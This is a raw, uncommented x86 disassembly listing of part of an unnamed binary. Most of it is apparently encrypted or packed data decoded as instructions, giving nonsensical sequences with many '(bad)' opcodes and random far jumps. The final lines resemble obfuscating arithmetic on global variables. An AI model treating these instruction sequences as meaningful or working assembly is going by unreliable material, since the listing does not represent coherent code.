  413b96:	arpl   WORD PTR [ecx],si
  413b98:	pop    esp
  413b99:	or     edx,esi
  413b9b:	mov    dh,0xe9
  413b9d:	sub    eax,0x6bd2d8d0
  413ba2:	stos   BYTE PTR es:[edi],al
  413ba3:	pop    ds
  413ba4:	jecxz  0x413ba7
  413ba6:	or     ah,BYTE PTR ds:0xa7171f90
  413bac:	jb     0x413b89
  413bae:	test   al,0xcf
  413bb0:	or     ebx,DWORD PTR [esi]
  413bb2:	lahf   
  413bb3:	jp     0x413b38
  413bb5:	add    bh,BYTE PTR [ecx+eiz*1-0x2c3930d9]
  413bbc:	lahf   
  413bbd:	inc    ecx
  413bbe:	push   ds
  413bbf:	push   0x94c96b44
  413bc4:	(bad)  
  413bc5:	sti    
  413bc6:	xchg   ebp,eax
  413bc7:	test   BYTE PTR [esi-0xfd1bdf9],ch
  413bcd:	xchg   al,ch
  413bcf:	and    DWORD PTR [eax+0x62],eax
  413bd2:	pop    esp
  413bd3:	shl    BYTE PTR [ecx+0x72],cl
  413bd6:	or     al,0xd
  413bd8:	or     cl,dl
  413bda:	inc    ebx
  413bdb:	xchg   DWORD PTR [edx-0xc],ebx
  413bde:	ret    0x31df
  413be1:	dec    ecx
  413be2:	pop    es
  413be3:	js     0x413bbf
  413be5:	xchg   esi,eax
  413be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413be7:	shl    BYTE PTR [edx],cl
  413be9:	sbb    BYTE PTR [esi-0x3e0d2d5a],bh
  413bef:	push   ds
  413bf0:	ss gs inc edx
  413bf3:	(bad)  
  413bf4:	outs   dx,DWORD PTR ds:[esi]
  413bf5:	into   
  413bf6:	fmulp  st(4),st
  413bf8:	jno    0x413b8d
  413bfa:	cmp    BYTE PTR [edi-0x59],cl
  413bfd:	scas   eax,DWORD PTR es:[edi]
  413bfe:	test   al,0x4e
  413c00:	outs   dx,BYTE PTR gs:[esi]
  413c02:	arpl   WORD PTR [esi-0x58c409c4],si
  413c08:	ja     0x413c89
  413c0a:	cdq    
  413c0b:	stos   DWORD PTR es:[edi],eax
  413c0c:	sub    al,0xa6
  413c0e:	shl    DWORD PTR [ebx],0xf1
  413c11:	pop    ds
  413c12:	inc    ebp
  413c13:	mov    al,0xdb
  413c15:	jp     0x413bf7
  413c17:	push   ebp
  413c18:	push   ebp
  413c19:	jns    0x413c20
  413c1b:	dec    esi
  413c1c:	pop    edx
  413c1d:	adc    al,0xef
  413c1f:	cmp    al,0xc
  413c21:	enter  0x7a75,0x16
  413c25:	repz sbb esi,ecx
  413c28:	adc    al,0x8c
  413c2a:	stc    
  413c2b:	call   0xab7860b
  413c30:	cmp    al,0xba
  413c32:	sub    al,0x5d
  413c34:	mov    cl,0x1f
  413c36:	jg     0x413c87
  413c38:	mov    ds:0x54de673e,eax
  413c3d:	jle    0x413cbb
  413c3f:	retf   0x8c22
  413c42:	pop    ebx
  413c43:	push   ebp
  413c44:	jge    0x413c9e
  413c46:	loopne 0x413c9f
  413c48:	stc    
  413c49:	pop    ecx
  413c4a:	shl    DWORD PTR [edx-0x2b],1
  413c4d:	cs cwde 
  413c4f:	dec    esi
  413c50:	stos   BYTE PTR es:[edi],al
  413c51:	jle    0x413ca2
  413c53:	jp     0x413bf9
  413c55:	and    al,0x4f
  413c57:	mov    bl,0x63
  413c59:	push   ds
  413c5a:	pop    edx
  413c5b:	pop    ss
  413c5c:	not    BYTE PTR [eax-0x44cd13c2]
  413c62:	push   es
  413c63:	aas    
  413c64:	mov    al,BYTE PTR [ecx]
  413c66:	and    al,0x99
  413c68:	push   eax
  413c69:	xor    DWORD PTR [eax+0x3],0xffffffe9
  413c6d:	retf   
  413c6e:	test   BYTE PTR [edi],0x48
  413c71:	jns    0x413ce6
  413c73:	(bad)  
  413c74:	scas   al,BYTE PTR es:[edi]
  413c75:	scas   eax,DWORD PTR es:[edi]
  413c76:	(bad)  
  413c77:	hlt    
  413c78:	(bad)  
  413c79:	dec    ebp
  413c7a:	out    0x15,al
  413c7c:	std    
  413c7d:	adc    dh,al
  413c7f:	call   0xf15b:0xf7c5998b
  413c86:	mov    eax,ds:0x79173914
  413c8b:	push   edi
  413c8c:	cli    
  413c8d:	sbb    dh,dh
  413c8f:	adc    al,0x24
  413c91:	retf   
  413c92:	xchg   BYTE PTR [edi+0x264f9bca],al
  413c98:	adc    bh,ah
  413c9a:	bound  ecx,QWORD PTR [esi+0x2aebda39]
  413ca0:	into   
  413ca1:	mov    al,0xaf
  413ca3:	sbb    ch,BYTE PTR [ecx+0x3c]
  413ca6:	jns    0x413c32
  413ca8:	xchg   ebp,eax
  413ca9:	out    dx,eax
  413caa:	aaa    
  413cab:	pusha  
  413cac:	dec    ecx
  413cad:	add    edi,DWORD PTR [eax+0x1e342048]
  413cb3:	dec    ebp
  413cb4:	inc    esp
  413cb5:	in     al,dx
  413cb6:	cmp    eax,0x2df7dce9
  413cbb:	mov    esi,0x3a9c7a45
  413cc0:	and    eax,0xea0326ca
  413cc5:	mov    WORD PTR [ecx+0x79f66d12],ss
  413ccb:	imul   edx,DWORD PTR [edi+0x7d78c8a9],0x3a
  413cd2:	add    eax,0xdb5b6d07
  413cd7:	fs sub eax,0xdac44a88
  413cdd:	leave  
  413cde:	jb     0x413d16
  413ce0:	aaa    
  413ce1:	or     eax,DWORD PTR [ecx-0x8]
  413ce4:	mov    edi,0x6c6f969
  413ce9:	test   eax,0xd9c73404
  413cee:	xlat   BYTE PTR ds:[ebx]
  413cef:	cmc    
  413cf0:	mov    WORD PTR [ebx+0x72],es
  413cf3:	mov    ds:0xb5682745,al
  413cf8:	mov    al,0x69
  413cfa:	rcl    DWORD PTR [edi-0x1a],cl
  413cfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cfe:	jge    0x413cae
  413d00:	stos   DWORD PTR es:[edi],eax
  413d01:	lods   al,BYTE PTR ds:[esi]
  413d02:	shl    DWORD PTR [edx-0x4d59d405],1
  413d08:	data16 jmp 0x413c96
  413d0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d0c:	mov    bl,0x64
  413d0e:	mov    cl,0x1
  413d10:	xchg   esp,eax
  413d11:	mov    dh,0xf6
  413d13:	cdq    
  413d14:	into   
  413d15:	push   cs
  413d16:	lds    ebp,FWORD PTR [ecx-0x72a8c51e]
  413d1c:	cmc    
  413d1d:	jmp    0x1da263be
  413d22:	add    DWORD PTR [ecx],0xc411baa
  413d28:	xchg   ebp,eax
  413d29:	add    BYTE PTR [ebp-0x6],al
  413d2c:	mov    eax,0xb322c6dd
  413d31:	lds    ebp,FWORD PTR [eax-0x34d15931]
  413d37:	(bad)  
  413d38:	shl    DWORD PTR [ecx+0x595bd72f],1
  413d3e:	bound  edi,QWORD PTR [ebp+0x40]
  413d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d42:	pop    es
  413d43:	adc    bl,BYTE PTR [esi+0x5f]
  413d46:	pop    ecx
  413d47:	into   
  413d48:	cdq    
  413d49:	(bad)  
  413d4a:	ja     0x413d12
  413d4c:	sub    eax,0xcfa7582d
  413d51:	inc    edi
  413d52:	pop    ebx
  413d53:	mov    dl,al
  413d55:	sar    BYTE PTR ds:0xf947514f,0x7e
  413d5c:	repnz and eax,0x4ab78303
  413d62:	inc    edi
  413d63:	jne    0x413d8d
  413d65:	scas   al,BYTE PTR es:[edi]
  413d66:	inc    esp
  413d67:	or     cl,ah
  413d69:	push   edx
  413d6a:	xor    bh,dl
  413d6c:	and    BYTE PTR [eax-0x16],ch
  413d6f:	push   edi
  413d70:	mov    esi,DWORD PTR [edi-0x3b0048f5]
  413d76:	mov    ?,WORD PTR [ebx+0x24b024e8]
  413d7c:	ds xor bl,0xeb
  413d80:	fcomp  QWORD PTR [edx+0x2f6182c1]
  413d86:	jg     0x413d6b
  413d88:	outs   dx,BYTE PTR ds:[esi]
  413d89:	cli    
  413d8a:	ins    BYTE PTR es:[edi],dx
  413d8b:	jge    0x413da0
  413d8d:	shr    BYTE PTR [ebp+0x7dc48fcd],1
  413d93:	(bad)  
  413d94:	mov    al,ds:0x1dcd2b6d
  413d99:	cmp    esp,DWORD PTR [edi+0x484a96c1]
  413d9f:	pop    esi
  413da0:	cmp    BYTE PTR [eax+0x40b13ab3],cl
  413da6:	icebp  
  413da7:	push   0x15
  413da9:	sahf   
  413daa:	xor    al,0x17
  413dac:	push   esp
  413dad:	sbb    eax,0x222e9d3c
  413db2:	pop    ds
  413db3:	in     eax,dx
  413db4:	ss xor al,0xec
  413db7:	xchg   ecx,eax
  413db8:	adc    bl,0x22
  413dbb:	sbb    al,0x3
  413dbd:	mov    ecx,0x2c2d46ec
  413dc2:	call   0xa72f:0xf34f8980
  413dc9:	sub    BYTE PTR [ebp-0x12],ch
  413dcc:	repnz adc edx,edx
  413dcf:	inc    ecx
  413dd0:	add    ah,al
  413dd2:	xchg   ebp,eax
  413dd3:	fdivrp st(6),st
  413dd5:	(bad)  
  413dd6:	loopne 0x413e39
  413dd8:	jb     0x413df3
  413dda:	out    dx,eax
  413ddb:	daa    
  413ddc:	ret    0x6a0
  413ddf:	xchg   ebp,eax
  413de0:	popa   
  413de1:	aaa    
  413de2:	push   esi
  413de3:	int    0xde
  413de5:	mov    bl,0xb5
  413de7:	mov    dh,BYTE PTR [esi-0x54]
  413dea:	inc    eax
  413deb:	sbb    al,0xae
  413ded:	ss jo  0x413e13
  413df0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413df1:	add    eax,0xea58509c
  413df6:	push   eax
  413df7:	mov    ds:0x33d60b9d,eax
  413dfc:	mov    esi,0x8d34ff2a
  413e01:	ss mov ebx,0x9624a5ec
  413e07:	outs   dx,DWORD PTR ds:[esi]
  413e08:	das    
  413e09:	jle    0x413e11
  413e0b:	and    edi,DWORD PTR [ebp-0x68be78cc]
  413e11:	std    
  413e12:	inc    eax
  413e13:	inc    ebx
  413e14:	xlat   BYTE PTR ds:[ebx]
  413e15:	or     eax,0x5c73e439
  413e1a:	adc    DWORD PTR [edx],ebx
  413e1c:	(bad)  
  413e1d:	sbb    DWORD PTR [ecx+0x56f8588a],ecx
  413e23:	ret    
  413e24:	sti    
  413e25:	pop    ebx
  413e26:	shr    BYTE PTR [ecx+0x763081cd],0xb4
  413e2d:	pop    es
  413e2e:	aaa    
  413e2f:	inc    edi
  413e30:	sbb    DWORD PTR [edi+0x4a61360f],edx
  413e36:	jns    0x413e4b
  413e38:	jae    0x413e83
  413e3a:	in     eax,0xaa
  413e3c:	and    eax,0x46a8714
  413e41:	div    BYTE PTR [ebp+0x29]
  413e44:	cli    
  413e45:	xor    al,0x43
  413e47:	pop    eax
  413e48:	xchg   ebx,eax
  413e49:	sub    ebx,DWORD PTR [ecx+0x4cab843d]
  413e4f:	fist   WORD PTR [esi+0x34]
  413e52:	fldenv [edi+0x34]
  413e55:	fstp   TBYTE PTR [ecx+edi*2+0x2374f3d9]
  413e5c:	lea    ecx,[edi-0x61cb7205]
  413e62:	imul   ebx,DWORD PTR ds:0x30df9409,0x263acc92
  413e6c:	sbb    eax,0x37a83fcc
  413e71:	mov    ds:0x9eb187cd,eax
  413e76:	pop    ebp
  413e77:	or     ecx,DWORD PTR [esi]
  413e79:	sbb    WORD PTR [edi-0x4a],cx
  413e7d:	cmp    BYTE PTR [ecx],bh
  413e7f:	(bad)  
  413e80:	fcom   DWORD PTR [ecx+ecx*2-0x7b]
  413e84:	cmp    eax,0xef70104
  413e89:	xchg   ecx,edx
  413e8b:	loopne 0x413ee0
  413e8d:	jmp    0x46ca:0x86adf411
  413e94:	jg     0x413e8f
  413e96:	(bad)  
  413e97:	jne    0x413e54
  413e99:	add    cl,BYTE PTR [ebx+esi*1]
  413e9c:	popf   
  413e9d:	or     BYTE PTR [edx],dh
  413e9f:	dec    ebx
  413ea0:	sub    eax,0xf27981c1
  413ea5:	pop    ss
  413ea6:	arpl   bx,bx
  413ea8:	xchg   edi,eax
  413ea9:	push   0xffffff83
  413eab:	out    dx,eax
  413eac:	(bad)  
  413ead:	jle    0x413e35
  413eaf:	adc    eax,0x5b047766
  413eb4:	jg     0x413f03
  413eb6:	(bad)  
  413eb7:	xor    edx,DWORD PTR [esi+0x2ac8ab90]
  413ebd:	cdq    
  413ebe:	pop    eax
  413ebf:	push   ebp
  413ec0:	sar    BYTE PTR [esi],1
  413ec2:	mov    ah,0xce
  413ec4:	cmp    eax,0x1c199668
  413ec9:	out    dx,eax
  413eca:	iret   
  413ecb:	xchg   ebp,eax
  413ecc:	call   FWORD PTR [edx-0x28]
  413ecf:	push   edi
  413ed0:	loop   0x413e76
  413ed2:	mov    ds:0xe9982232,al
  413ed7:	xor    bl,BYTE PTR [ecx-0x80]
  413eda:	jg     0x413f4c
  413edc:	push   ss
  413edd:	push   esi
  413ede:	mov    edx,0xb5317391
  413ee3:	push   0xc53cfd74
  413ee8:	aas    
  413ee9:	ret    0x2de9
  413eec:	icebp  
  413eed:	and    al,0x7
  413eef:	sbb    BYTE PTR [ebp-0x14bfb959],dl
  413ef5:	xor    edi,ebx
  413ef7:	sub    al,0x9e
  413ef9:	jno    0x413f1e
  413efb:	jno    0x413f71
  413efd:	and    al,0x66
  413eff:	push   esp
  413f00:	dec    ecx
  413f01:	and    esp,edx
  413f03:	xlat   BYTE PTR ds:[ebx]
  413f04:	xchg   ebp,eax
  413f05:	ror    BYTE PTR [ecx],0xc
  413f08:	sbb    eax,0x7b4c378b
  413f0d:	jb     0x413f71
  413f0f:	xor    BYTE PTR [ebx-0xb926c63],cl
  413f15:	pop    eax
  413f16:	ins    BYTE PTR es:[edi],dx
  413f17:	imul   ebp,DWORD PTR es:[edx+0x28f7fc44],0x75f1dd22
  413f22:	lea    eax,[edx]
  413f24:	cli    
  413f25:	adc    ch,cl
  413f27:	fisub  DWORD PTR [ebx]
  413f29:	sbb    eax,0xb4e23a93
  413f2e:	xor    dh,BYTE PTR [edi-0x10]
  413f31:	jmp    0x413f12
  413f33:	jle    0x413f4f
  413f35:	je     0x413fb5
  413f37:	into   
  413f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f39:	cmp    eax,DWORD PTR [edx+eiz*1]
  413f3c:	inc    ecx
  413f3d:	push   ebp
  413f3e:	adc    al,BYTE PTR [edi+0x3ebbc51b]
  413f44:	mov    edx,0xc1fd691b
  413f49:	popa   
  413f4a:	arpl   WORD PTR [edi],si
  413f4c:	mov    ebp,0xc822249f
  413f51:	adc    al,0x92
  413f53:	cdq    
  413f54:	adc    al,0x7b
  413f56:	mov    al,0xb6
  413f58:	push   ds
  413f59:	cld    
  413f5a:	pop    ss
  413f5b:	inc    ecx
  413f5c:	lods   eax,DWORD PTR ds:[esi]
  413f5d:	xor    al,0x4
  413f5f:	retf   0xadd2
  413f62:	xor    DWORD PTR [edi-0x26],ebx
  413f65:	sub    DWORD PTR [edx],ecx
  413f67:	or     eax,0xda66df3f
  413f6c:	mov    ds:0x165780af,al
  413f71:	aad    0x13
  413f73:	mov    ds:0x30e9ede0,al
  413f78:	jmp    DWORD PTR [ebx+0x2c]
  413f7b:	pop    esi
  413f7c:	inc    edx
  413f7d:	sbb    BYTE PTR [eax+ebx*1],bl
  413f80:	pop    esi
  413f81:	jecxz  0x413fcc
  413f83:	xchg   edx,eax
  413f84:	in     al,dx
  413f85:	xchg   DWORD PTR cs:[edx+0x69],edx
  413f89:	mov    BYTE PTR [eax-0x7cea9730],dl
  413f8f:	jmp    0xd899c27b
  413f94:	int3   
  413f95:	mov    ecx,0x500a39a4
  413f9a:	sbb    DWORD PTR [edi-0x3a],ebx
  413f9d:	xor    DWORD PTR [esi],esi
  413f9f:	mov    eax,ds:0xca61fd57
  413fa4:	or     edi,DWORD PTR [eax]
  413fa6:	and    BYTE PTR [ecx+0x58],ch
  413fa9:	or     al,0x73
  413fab:	sahf   
  413fac:	fidiv  WORD PTR [ecx]
  413faf:	dec    ebp
  413fb0:	jb     0x413feb
  413fb2:	sbb    dl,BYTE PTR [eax+0x41e82f03]
  413fb8:	xor    eax,0x7fd73514
  413fbd:	jle    0x413f82
  413fbf:	stos   DWORD PTR es:[edi],eax
  413fc0:	dec    esi
  413fc2:	fiadd  WORD PTR [eax+ebp*2-0x6a976d60]
  413fc9:	and    BYTE PTR [edi-0x7d83fe04],0x56
  413fd0:	jl     0x413fb4
  413fd2:	mov    ds,WORD PTR [ebx]
  413fd4:	lahf   
  413fd5:	jmp    0x413f5a
  413fd7:	xchg   esi,eax
  413fd8:	jns    0x413fa5
  413fda:	cmp    edi,DWORD PTR [eax+0x762fd294]
  413fe0:	xchg   edi,eax
  413fe1:	shl    BYTE PTR [ebx-0x6c],0x49
  413fe5:	bound  ebp,QWORD PTR [edx-0x431d5b92]
  413feb:	jecxz  0x413fd6
  413fed:	das    
  413fee:	stos   DWORD PTR es:[edi],eax
  413fef:	js     0x413fe3
  413ff1:	aam    0xe6
  413ff3:	ror    DWORD PTR ds:0x25bf711b,1
  413ff9:	push   0x3c0380b9
  413ffe:	and    DWORD PTR [edx],edx
  414000:	stos   DWORD PTR es:[edi],eax
  414001:	pop    edi
  414002:	(bad)  
  414003:	sub    ecx,DWORD PTR [eax]
  414005:	jns    0x41403c
  414007:	fldcw  WORD PTR [ebx+0x5c395c1d]
  41400d:	and    esp,DWORD PTR [edx+0x7c217e10]
  414013:	mov    BYTE PTR [ecx+0x767698a6],bh
  414019:	repz mov esi,0x3dde1100
  41401f:	adc    BYTE PTR [ecx+0x7636cbcc],0xcc
  414026:	rcr    DWORD PTR [edx+ecx*8+0x57],1
  41402a:	jg     0x41404f
  41402c:	inc    edx
  41402d:	fs sbb eax,0x14e98d96
  414033:	popf   
  414034:	shl    esi,0x39
  414037:	mov    ecx,0x6f926b43
  41403c:	adc    DWORD PTR [edx],ecx
  41403e:	shl    BYTE PTR [edi-0x79],1
  414041:	mov    ch,0x98
  414043:	sti    
  414044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414045:	push   esi
  414046:	mov    ah,0x1a
  414048:	mov    eax,0xc9fc52c1
  41404d:	or     al,0x23
  41404f:	lods   eax,DWORD PTR ds:[esi]
  414050:	xchg   esi,eax
  414052:	loope  0x414082
  414054:	dec    edx
  414055:	repnz outs dx,DWORD PTR ds:[esi]
  414057:	pushf  
  414058:	int3   
  414059:	retf   
  41405a:	sbb    edi,ebp
  41405c:	es xchg edi,eax
  41405e:	xor    dh,BYTE PTR [edi]
  414060:	call   0x8309cbb2
  414065:	loopne 0x41402a
  414067:	fsubr  QWORD PTR [ebx+0x6cf8cda7]
  41406d:	add    DWORD PTR [edx],0x4f
  414070:	jle    0x41401e
  414072:	jp     0x4140b3
  414074:	stc    
  414075:	loope  0x4140e8
  414077:	lds    ebp,FWORD PTR [edi+0x49]
  41407a:	mov    dl,0x40
  41407c:	test   al,0x34
  41407e:	xor    al,0x99
  414080:	fiadd  DWORD PTR [edi+0x22]
  414083:	inc    ecx
  414084:	inc    esi
  414085:	xchg   esp,eax
  414086:	sub    ebx,DWORD PTR [edi+0x5f8c284b]
  41408c:	int3   
  41408d:	or     dh,dl
  41408f:	mov    cs,WORD PTR [ecx+0x32]
  414092:	push   ebx
  414093:	jns    0x414062
  414095:	(bad)  
  414096:	loopne 0x414079
  414098:	pop    ecx
  414099:	mov    bl,0xfe
  41409b:	cld    
  41409c:	cmp    al,BYTE PTR [eax]
  41409e:	jmp    0x749f:0x61c2455f
  4140a5:	and    bh,ch
  4140a7:	aad    0x40
  4140a9:	xor    al,0xbe
  4140ab:	jbe    0x41411c
  4140ad:	pop    ecx
  4140ae:	or     bh,BYTE PTR [ebp+0x129a5948]
  4140b4:	lahf   
  4140b5:	dec    ebp
  4140b6:	test   BYTE PTR [edi],bh
  4140b8:	ins    BYTE PTR es:[edi],dx
  4140b9:	mov    ecx,0xd744eb9b
  4140be:	dec    esi
  4140bf:	jmp    0x8e94:0xca2ffb88
  4140c6:	frstor [ebp+0x60]
  4140c9:	push   ebx
  4140ca:	adc    DWORD PTR [ecx+0x7c2b206f],0xf2c395c8
  4140d4:	cmp    BYTE PTR [ecx-0x7364b45a],0x83
  4140db:	aas    
  4140dc:	aaa    
  4140dd:	sar    DWORD PTR [eax-0x4705a138],1
  4140e3:	pop    ebx
  4140e4:	test   eax,0xb27989f5
  4140e9:	sbb    eax,DWORD PTR [edx+0x45]
  4140ec:	push   ds
  4140ed:	dec    ebx
  4140ee:	sub    edx,DWORD PTR [eax-0x33]
  4140f1:	inc    edx
  4140f2:	jnp    0x4140b9
  4140f4:	adc    BYTE PTR [edx-0x47],bh
  4140f7:	sbb    BYTE PTR [ebx+0x60],bl
  4140fa:	xchg   BYTE PTR [esi],cl
  4140fc:	ret    
  4140fd:	adc    ecx,DWORD PTR [eax+ecx*1+0x41]
  414101:	pop    ebx
  414102:	sbb    DWORD PTR [esi-0x14],esi
  414105:	call   0x5dd8:0xaf067632
  41410c:	xchg   esi,eax
  41410d:	pushf  
  41410e:	scas   al,BYTE PTR es:[edi]
  41410f:	lods   al,BYTE PTR ds:[esi]
  414110:	cmc    
  414111:	iret   
  414112:	push   0xffffffb3
  414114:	or     edi,ecx
  414116:	scas   eax,DWORD PTR es:[edi]
  414117:	mov    edi,0xad65f954
  41411c:	cs stc 
  41411e:	sbb    esi,DWORD PTR [ecx-0x3c]
  414121:	sbb    dh,bl
  414123:	aam    0xc3
  414125:	xchg   bh,bl
  414127:	fcmovbe st,st(2)
  414129:	add    dl,BYTE PTR [edx]
  41412b:	ret    
  41412c:	(bad)  
  41412d:	sbb    BYTE PTR ds:0xaba50add,cl
  414133:	ret    0x6ca5
  414136:	cmp    eax,0xcb7a177
  41413b:	mov    esp,0x1c6968c7
  414140:	test   DWORD PTR [ecx+0x46],ebx
  414143:	dec    esp
  414144:	or     ch,BYTE PTR [ebx+esi*4]
  414147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414148:	push   ebx
  414149:	dec    ecx
  41414a:	data16 adc al,0x3a
  41414d:	fldcw  WORD PTR [edx]
  41414f:	pushw  ss
  414151:	jmp    DWORD PTR [edx]
  414153:	addr16 mov ah,0x83
  414156:	rcr    BYTE PTR [edx-0x37a2a452],cl
  41415c:	fist   WORD PTR [eax-0x70dde469]
  414162:	push   edx
  414163:	fst    QWORD PTR [ebp+0x3a]
  414166:	cdq    
  414167:	jp     0x4140f4
  414169:	cli    
  41416a:	and    eax,ebp
  41416c:	pop    ss
  41416d:	aad    0x2b
  41416f:	imul   esp,DWORD PTR [ebx],0xbc25986d
  414175:	mov    bh,0xf
  414177:	dec    ecx
  414178:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41417a:	imul   edi,esp,0x43452852
  414180:	jle    0x41412f
  414182:	cli    
  414183:	ror    BYTE PTR [ecx-0x7a59bc34],1
  414189:	mov    cl,0x60
  41418b:	hlt    
  41418c:	sti    
  41418d:	(bad)  
  41418e:	ret    
  41418f:	not    DWORD PTR [ebx+0x29795f1]
  414195:	scas   eax,DWORD PTR es:[edi]
  414196:	sar    DWORD PTR [ecx+ebx*8],cl
  414199:	mov    ebx,0x3c1504d3
  41419e:	imul   ecx,DWORD PTR [edi+0x1e354ff7],0x7ae5efa1
  4141a8:	cmp    dl,BYTE PTR [ebx+0x26da1000]
  4141ae:	dec    edx
  4141af:	mov    eax,ds:0xbd85f422
  4141b4:	and    al,0x97
  4141b6:	stc    
  4141b7:	add    bl,BYTE PTR [eax]
  4141b9:	mov    DWORD PTR [ebp-0x36],edx
  4141bc:	jae    0x414205
  4141be:	sti    
  4141bf:	arpl   bx,bx
  4141c1:	stos   DWORD PTR es:[edi],eax
  4141c2:	and    dl,BYTE PTR ds:0x5320d3a5
  4141c8:	sub    esp,DWORD PTR [edi-0x38]
  4141cb:	mov    DWORD PTR [edi],ecx
  4141cd:	or     eax,0x70f36cdd
  4141d2:	push   esp
  4141d3:	aam    0xbf
  4141d5:	jae    0x414175
  4141d7:	sub    BYTE PTR [ebx-0x70],ch
  4141da:	lds    edi,FWORD PTR [edi]
  4141dc:	popf   
  4141dd:	jg     0x4141d9
  4141df:	(bad)  
  4141e0:	rcr    DWORD PTR [esp+ebx*1-0x20d00360],1
  4141e7:	jmp    0x4141d4
  4141e9:	mov    al,0x35
  4141eb:	sub    DWORD PTR [esi-0x7fab8d6],ecx
  4141f1:	lds    ebp,FWORD PTR [edx-0x6bbd1de4]
  4141f7:	add    eax,0x7e219e89
  4141fc:	add    eax,0xb042d772
  414201:	mov    eax,ds:0xef78784e
  414206:	inc    esp
  414207:	jmp    0x5ece:0xdd15bd11
  41420e:	sbb    al,0x85
  414210:	fmul   st(3),st
  414212:	mov    eax,ds:0x5431cedb
  414217:	push   ebp
  414218:	rcr    dh,0xc8
  41421b:	ja     0x4141e7
  41421d:	ficomp WORD PTR [ecx-0x55baa392]
  414223:	push   ss
  414224:	(bad)  
  414225:	repnz or al,0x48
  414228:	dec    esp
  414229:	jno    0x414264
  41422b:	add    dh,BYTE PTR [ecx+eax*2]
  41422e:	add    al,0xcd
  414230:	push   esi
  414231:	jp     0x4141d2
  414233:	push   ecx
  414234:	mov    ch,0xf2
  414236:	fidiv  WORD PTR [ebp+0x7ce921fe]
  41423c:	xor    esi,DWORD PTR [edx+0x27]
  41423f:	pop    ebp
  414240:	mov    bl,0x3c
  414242:	inc    ebx
  414243:	sub    al,0xab
  414245:	inc    edx
  414246:	gs pop esi
  414248:	xchg   DWORD PTR [edx],esp
  41424a:	mov    al,ds:0xeeb03333
  41424f:	push   ebx
  414250:	mov    BYTE PTR [esi+0x29],dl
  414253:	mov    esi,0x5d1de3f
  414258:	xchg   ecx,eax
  414259:	push   edx
  41425a:	mov    ds:0x724de25a,eax
  41425f:	mov    edx,0x8b3723cc
  414264:	iret   
  414265:	or     dl,BYTE PTR [ecx+edx*4+0x1714c23c]
  41426c:	hlt    
  41426d:	cmp    al,0x4c
  414270:	adc    al,0x41
  414272:	pop    ecx
  414273:	sub    eax,edx
  414275:	ror    DWORD PTR [ebp+0x4245df1b],1
  41427b:	aaa    
  41427c:	mov    ebp,0x435ddaae
  414281:	pop    esp
  414282:	(bad)  
  414283:	sub    esp,DWORD PTR [ecx+ecx*4-0x2e3d8010]
  41428a:	adc    edx,DWORD PTR [ecx-0x54]
  41428d:	and    BYTE PTR [eax-0x79c4cbc9],0x57
  414294:	push   edi
  414295:	xchg   ebp,eax
  414296:	push   ds
  414297:	push   esi
  414298:	mov    esp,0x6b0aeb8e
  41429d:	xor    DWORD PTR [ebx+0x1f495ee3],0xa6d4c283
  4142a7:	fadd   QWORD PTR [edi]
  4142a9:	das    
  4142aa:	dec    esp
  4142ab:	jae    0x41422e
  4142ad:	aam    0xa6
  4142af:	shr    BYTE PTR [edi+0x2d398b21],0xd
  4142b6:	jl     0x4142c0
  4142b8:	out    0xc6,al
  4142ba:	outs   dx,DWORD PTR ds:[esi]
  4142bb:	mov    cl,0xdd
  4142bd:	shl    DWORD PTR ds:0x27857723,1
  4142c3:	setp   BYTE PTR [ecx+edx*2]
  4142c7:	fstp   DWORD PTR [ebx+eiz*1]
  4142ca:	inc    ecx
  4142cb:	mov    ecx,0x6c345904
  4142d0:	xor    DWORD PTR [edi-0x10],esp
  4142d3:	in     eax,0x22
  4142d5:	push   ebp
  4142d6:	bnd call 0x9ced1d71
  4142dc:	push   esi
  4142dd:	xchg   ebp,eax
  4142de:	sub    eax,0xc26462f
  4142e3:	ins    BYTE PTR es:[edi],dx
  4142e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142e5:	aas    
  4142e6:	shr    BYTE PTR [ebx+0x36696aa9],1
  4142ec:	jbe    0x41433d
  4142ee:	jle    0x414365
  4142f0:	retf   
  4142f1:	pop    edx
  4142f2:	cld    
  4142f3:	dec    edx
  4142f4:	sbb    BYTE PTR [edx+0x13057d77],al
  4142fa:	xlat   BYTE PTR ds:[ebx]
  4142fb:	scas   al,BYTE PTR es:[edi]
  4142fc:	push   ds
  4142fd:	loop   0x414360
  4142ff:	mov    esi,0xa133c1dc
  414304:	pop    ebp
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	enter  0x789b,0x75
  41430a:	cmp    BYTE PTR ds:0x842c868e,ch
  414310:	in     al,0xb5
  414312:	xchg   edi,eax
  414313:	cs jmp 0x41431e
  414316:	push   eax
  414317:	adc    BYTE PTR [eax+0x19d32bb0],cl
  41431d:	cmp    eax,0x428647
  414322:	sub    edx,esi
  414324:	add    DWORD PTR ds:0x42863f,ecx
  41432a:	xor    edx,eax
  41432c:	mov    ebx,DWORD PTR ds:0x42864f
  414332:	add    DWORD PTR ds:0x428623,ebx
  414338:	mov    DWORD PTR [ebp+0x8],edx
  41433b:	mov    edx,DWORD PTR [ebp+0x8]
  41433e:	inc    ebx
  41433f:	mov    ebx,DWORD PTR [ebp-0x58]
  414342:	sub    DWORD PTR ds:0x428663,0x42863f
  41434c:	add    edx,0x5708f1
  414352:	and    DWORD PTR ds:0x428647,0x6a8d
  41435c:	imul   edx,ebx
  41435f:	xor    ebx,ebx
  414361:	or     ebx,DWORD PTR ds:0x42861f
  414367:	adc    DWORD PTR ds:0x42860f,ebx
  41436d:	mov    DWORD PTR [ebp-0x58],edx
  414370:	mov    edx,DWORD PTR [ebp+0x8]
  414373:	mov    ebx,DWORD PTR [ebp-0x54]
  414376:	add    edx,0x64f893
  41437c:	sbb    DWORD PTR ds:0x4285ff,0x4a3d
  414386:	or     edx,ebx
  414388:	mov    DWORD PTR [ebp-0x54],edx
  41438b:	or     DWORD PTR ds:0x4285db,edx
  414391:	mov    edx,DWORD PTR [ebp+0x8]
  414394:	mov    DWORD PTR ds:0x428653,0x1a
